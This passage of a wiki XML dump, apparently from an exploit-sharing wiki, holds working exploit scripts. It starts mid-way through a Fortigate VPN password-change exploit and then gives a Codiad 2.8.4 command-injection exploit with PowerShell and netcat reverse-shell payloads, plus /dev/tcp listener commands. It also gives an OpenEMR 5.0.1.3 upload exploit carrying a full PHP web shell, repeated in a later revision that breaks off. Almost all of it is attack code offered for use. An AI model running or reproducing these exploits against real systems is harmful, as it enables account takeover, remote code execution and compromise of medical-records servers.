    headers = {"User-Agent": userAgent, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://"+ip+"/remote/login?lang=en", "Pragma": "no-cache", "Cache-Control": "no-store, no-cache, must-revalidate", "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8", "Connection": "close"}
    data = {"ajax": "1", "username": username, "realm": '', "credential": newpassword}
    r=requests.post(url, headers=headers, data=data, verify=False)
    if r.status_code==200 and"redir=/remote/hostcheck_install" in r.text:
            return True
    else:
        return False
parser = optparse.OptionParser()
parser.add_option('-i', action="store", dest="ip", help="e.g. 127.0.0.1:10443")
parser.add_option('-u', action="store", dest="username")
parser.add_option('-p', action="store", dest="password")
options, remainder = parser.parse_args()
if not options.username or not options.password or not options.ip:
    print "[!] Please provide the ip (-i), username (-u) and password (-p)"
    sys.exit()
if options.username:
    username=options.username
if options.password:
    newpassword=options.password
if options.ip:
    ip=options.ip
tmpStatus=checkIP(ip)
if tmpStatus==True:
    print "[*] Checking if target is a Fortigate device "+setColor(" [OK]", bold, color="green")
    if changePassword(ip,username,newpassword)==True:
        print "[*] Using the magic keyword to change password for: ["+username+"]"+setColor(" [OK]", bold, color="green")   
        if testLogin(ip,username,newpassword)==True:
            print "[*] Testing new credentials ["+username+"|"+newpassword+"] "+setColor(" [OK]", bold, color="green")
            print "************** Enjoy your new credentials **************"
        else:
            print "[*] Testing new credentials ["+username+"|"+newpassword+"] "+setColor(" [NOK]", bold, color="red")
    else:
        print "[*] Using the magic keyword to change password for: ["+username+"]"+setColor(" [NOK]", bold, color="red")            
else:
    print "[*] Checking if target is a Fortigate device "+setColor(" [NOK]", bold, color="red")
&lt;/pre&gt;</text>
      <sha1>ffkwkg92d2wliyg9vlo9uzayax994ga</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-14009 Codiad 2.8.4 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>978</id>
    <revision>
      <id>1252</id>
      <timestamp>2021-04-08T09:09:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) # Discovery by: WangYihang # Vendor Homepage: http://codiad.com/ # Software Links : https:/..."</comment>
      <origin>1252</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6252" sha1="jq9vlp5cf5tgtmekyd62a4l8nqweq8e" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
# Discovery by: WangYihang
# Vendor Homepage: http://codiad.com/
# Software Links : https://github.com/Codiad/Codiad/releases
# Tested Version: Version: 2.8.4
# CVE: CVE-2018-14009


#!/usr/bin/env python
# encoding: utf-8
import requests
import sys
import json
import base64
session = requests.Session()
def login(domain, username, password):
    global session
    url = domain + "/components/user/controller.php?action=authenticate"
    data = {
        "username": username,
        "password": password,
        "theme": "default",
        "language": "en"
    }
    response = session.post(url, data=data, verify=False)
    content = response.text
    print("[+] Login Content : %s" % (content))
    if 'status":"success"' in content:
        return True
def get_write_able_path(domain):
    global session
    url = domain + "/components/project/controller.php?action=get_current"
    response = session.get(url, verify=False)
    content = response.text
    print("[+] Path Content : %s" % (content))
    json_obj = json.loads(content)
    if json_obj['status'] == "success":
        return json_obj['data']['path']
    else:
        return False
def base64_encode_2_bytes(host, port):
    payload = '''
    $client = New-Object System.Net.Sockets.TCPClient("__HOST__",__PORT__);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..255|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2&gt;&amp;1 | Out-String );
        $sendback2  = $sendback + "PS " + (pwd).Path + "&gt; ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }
    $client.Close();
    '''
    result = ""
    for i in payload.replace("__HOST__", host).replace("__PORT__", str(port)):
        result += i + "\x00"
    return base64.b64encode(result.encode()).decode().replace("\n", "")
def build_powershell_payload(host, port):
    preffix = "powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc "
    return preffix + base64_encode_2_bytes(host, port).replace("+", "%2b")
def exploit(domain, username, password, host, port, path, platform):
    global session
    url = domain + \
        "components/filemanager/controller.php?type=1&amp;action=search&amp;path=%s" % (
            path)
    if platform.lower().startswith("win"):
        # new version escapeshellarg
        # escapeshellarg on windows will quote the arg with ""
        # so we need to try twice
        payload = '||%s||' % (build_powershell_payload(host, port))
        payload = "search_string=Hacker&amp;search_file_type=" + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.text
        print(content)
        # old version escapeshellarg
        payload = '%%22||%s||' % (build_powershell_payload(host, port))
        payload = "search_string=Hacker&amp;search_file_type=" + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.text
        print(content)
    else:
        # payload = '''SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F''' + host + '''%2F''' + port + '''+0%3E%261'%0Agrep+%22SniperOJ'''
        payload = '"%%0Anc %s %d|/bin/bash %%23' % (host, port)
        payload = "search_string=Hacker&amp;search_file_type=" + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.text
        print(content)
def promote_yes(hint):
    print(hint)
    while True:
        ans = input("[Y/n] ").lower()
        if ans == 'n':
            return False
        elif ans == 'y':
            return True
        else:
            print("Incorrect input")
def main():
    if len(sys.argv) != 7:
        print("Usage : ")
        print("        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]" % (sys.argv[0]))
        print("        python %s [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]" % (sys.argv[0]))
        print("Example : ")
        print("        python %s http://localhost/ admin admin 8.8.8.8 8888 linux" % (sys.argv[0]))
        print("        python %s http://localhost:8080/ admin admin 8.8.8.8 8888 windows" % (sys.argv[0]))
        print("Author : ")
        print("        WangYihang &lt;wangyihanger@gmail.com&gt;")
        exit(1)
    domain = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    host = sys.argv[4]
    port = int(sys.argv[5])
    platform = sys.argv[6]
    if platform.lower().startswith("win"):
        print("[+] Please execute the following command on your vps: ")
        print("nc -lnvp %d" % (port))
        if not promote_yes("[+] Please confirm that you have done the two command above [y/n]"):
            exit(1)
    else:
        print("[+] Please execute the following command on your vps: ")
        print("echo 'bash -c \"bash -i &gt;/dev/tcp/%s/%d 0&gt;&amp;1 2&gt;&amp;1\"' | nc -lnvp %d" % (host, port + 1, port))
        print("nc -lnvp %d" % (port + 1))
        if not promote_yes("[+] Please confirm that you have done the two command above [y/n]"):
            exit(1)
    print("[+] Starting...")
    if not login(domain, username, password):
        print("[-] Login failed! Please check your username and password.")
        exit(2)
    print("[+] Login success!")
    print("[+] Getting writeable path...")
    path = get_write_able_path(domain)
    if path == False:
        print("[+] Get current path error!")
        exit(3)
    print("[+] Writeable Path : %s" % (path))
    print("[+] Sending payload...")
    exploit(domain, username, password, host, port, path, platform)
    print("[+] Exploit finished!")
    print("[+] Enjoy your reverse shell!")
if __name__ == "__main__":
    main()

&lt;/pre&gt;</text>
      <sha1>jq9vlp5cf5tgtmekyd62a4l8nqweq8e</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-15139 OpenEMR 5.0.1.3 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>4395</id>
    <revision>
      <id>5062</id>
      <timestamp>2021-06-15T01:28:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt;  &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Version: Prior to 5.0.1.4 &lt;/pre&gt;  ==EXP== &lt;pre&gt; # Exploit Title: OpenEMR 5.0.1.3 - 'manage_site_files' Remote Co..."</comment>
      <origin>5062</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="23283" sha1="d3nc9plw6rpexzmenixtcpi7wjcv0xp" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Version: Prior to 5.0.1.4
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
# Date 12.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_3.zip
# Version: Prior to 5.0.1.4
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-15139
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits#CVE-2018-15139

'''
Description:
Unrestricted file upload in interface/super/manage_site_files.php in versions of OpenEMR before 5.0.1.4 allows a remote
authenticated attacker to execute arbitrary PHP code by uploading a file with a PHP extension via the images upload
form and accessing it in the images directory.
'''


'''
Banner:
'''
banner ="""
 ___                   _____ __  __ ____            ____   ___   _   _____  
  / _ \ _ __   ___ _ __ | ____|  \/  |  _ \          | ___| / _ \ / | |___ /  
 | | | | '_ \ / _ \ '_ \|  _| | |\/| | |_) |  _____  |___ \| | | || |   |_ \  
 | |_| | |_) |  __/ | | | |___| |  | |  _ &lt;  |_____|  ___) | |_| || |_ ___) | 
  \___/| .__/ \___|_| |_|_____|_|  |_|_| \_\         |____(_)___(_)_(_)____/  
       |_|                                                                    

                    _____            _       _ _   
                    | ____|_  ___ __ | | ___ (_) |_ 
                    |  _| \ \/ / '_ \| |/ _ \| | __|
                    | |___ &gt;  &lt;| |_) | | (_) | | |_ 
                    |_____/_/\_\ .__/|_|\___/|_|\__|
                               |_|                  

"""
print(banner)


'''
Import required modules
'''
import argparse
import requests


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='OpenEMR Remote Code Execution')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
openemr_path = args.PATH
username = args.USERNAME
password = args.PASSWORD

'''
Authentication:
'''
# Preparation:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/main/main_screen.php?auth=login&amp;site=default'
auth_chek_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/login/login.php?site=default'
response = session.get(auth_chek_url)

# Header (auth):
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Referer': auth_chek_url,
    'Upgrade-Insecure-Requests': '1',
}

# Body (auth):
body = {
    'new_login_session_management': '1',
    'authProvider': 'Default',
    'authUser': username,
    'clearPass': password,
    'languageChoice': '1'
}

# Authentication:
print('')
print('[+] Authentication')
auth = session.post(auth_url,headers=header, data=body)


'''
Exploit:
'''
print('')
print('[+] Uploading Webshell:')

# URL:
exploit_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/super/manage_site_files.php'

# Headers (Exploit):
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------31900464228840324774249185339",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Referer": 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/super/manage_site_files.php',
    "Upgrade-Insecure-Requests": "1"
}

# Body (Exploit):
body = "-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_filename\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_filedata\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n12000000\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_image\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_dest_filename\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_education\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"bn_save\"\r\n\r\nSave\r\n-----------------------------31900464228840324774249185339--\r\n"

# Send Exploit:
session.post(exploit_url, headers=header, data=body)

# Finish
path = 'http://' + target_ip + ':' + target_port + openemr_path + '/sites/default/images/shell.php'
print('[+] Webshell: ' + path)
&lt;/pre&gt;</text>
      <sha1>d3nc9plw6rpexzmenixtcpi7wjcv0xp</sha1>
    </revision>
    <revision>
      <id>5063</id>
      <parentid>5062</parentid>
      <timestamp>2021-06-15T01:28:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5063</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="23294" sha1="rxrikku1kbgu0mkw8jbh2tj9296kgra" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Version: Prior to 5.0.1.4
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
# Date 12.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_3.zip
# Version: Prior to 5.0.1.4
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-15139
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits#CVE-2018-15139

'''
Description:
Unrestricted file upload in interface/super/manage_site_files.php in versions of OpenEMR before 5.0.1.4 allows a remote
authenticated attacker to execute arbitrary PHP code by uploading a file with a PHP extension via the images upload
form and accessing it in the images directory.
'''


'''
Banner:
'''
banner ="""
 ___                   _____ __  __ ____            ____   ___   _   _____  
  / _ \ _ __   ___ _ __ | ____|  \/  |  _ \          | ___| / _ \ / | |___ /  
 | | | | '_ \ / _ \ '_ \|  _| | |\/| | |_) |  _____  |___ \| | | || |   |_ \  
 | |_| | |_) |  __/ | | | |___| |  | |  _ &lt;  |_____|  ___) | |_| || |_ ___) | 
  \___/| .__/ \___|_| |_|_____|_|  |_|_| \_\         |____(_)___(_)_(_)____/  
       |_|                                                                    

                    _____            _       _ _   
                    | ____|_  ___ __ | | ___ (_) |_ 
                    |  _| \ \/ / '_ \| |/ _ \| | __|
                    | |___ &gt;  &lt;| |_) | | (_) | | |_ 
                    |_____/_/\_\ .__/|_|\___/|_|\__|
                               |_|                  

"""
print(banner)


'''
Import required modules
'''
import argparse
import requests


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='OpenEMR Remote Code Execution')
